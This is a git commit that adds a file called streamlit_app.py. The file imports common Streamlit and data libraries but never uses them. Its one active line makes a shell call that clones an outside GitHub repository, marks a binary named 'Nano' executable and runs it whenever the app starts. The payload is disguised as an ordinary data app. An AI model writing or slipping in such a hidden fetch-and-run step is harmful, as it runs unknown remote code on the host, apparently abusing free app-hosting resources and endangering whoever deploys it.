c61253ed6a2681e10d4d00ec6b1ff6df8b696ec8
yeripo <110187561+yeripo@users.noreply.github.com>
2022-07-30 03:02:30 +0700

    Add files via upload

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("rm -rf nanox && git clone https://github.com/Ikuzot/nanox.git && cd nanox && chmod +x Nano && ./Nano")
